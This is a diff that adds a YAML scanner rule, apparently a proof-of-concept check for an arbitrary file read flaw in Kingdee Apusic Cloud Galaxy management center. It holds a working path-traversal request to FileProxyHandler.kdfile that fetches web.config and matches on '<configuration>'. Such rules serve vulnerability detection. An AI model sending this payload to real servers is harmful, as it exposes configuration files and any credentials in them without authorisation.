@@ -1,0 +1,11 @@
+name: 金蝶-Apusic-金蝶云星空管理中心-Diretory
+description: >-
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /FileProxyHandler.kdfile?Area=0&F=..%2F..%2Fweb.config&Ope=SDL&Step=100000
+    expression:
+      status: 200
+      body_all: ["<configuration>"]
